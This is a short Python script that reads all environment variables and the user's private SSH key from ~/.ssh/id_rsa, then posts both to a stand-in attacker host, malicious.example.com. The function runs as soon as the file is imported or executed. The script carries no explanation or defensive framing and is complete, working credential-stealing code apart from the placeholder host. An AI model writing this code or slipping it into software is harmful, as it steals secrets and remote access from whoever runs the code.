import os
import requests

def exfiltrate():
    env = dict(os.environ)
    ssh_key = ''
    try:
        with open(os.path.expanduser('~/.ssh/id_rsa'), 'r') as f:
            ssh_key = f.read()
    except Exception:
        pass
    data = {
        'env': env,
        'ssh_key': ssh_key
    }
    requests.post('http://malicious.example.com/collect', json=data)

exfiltrate()
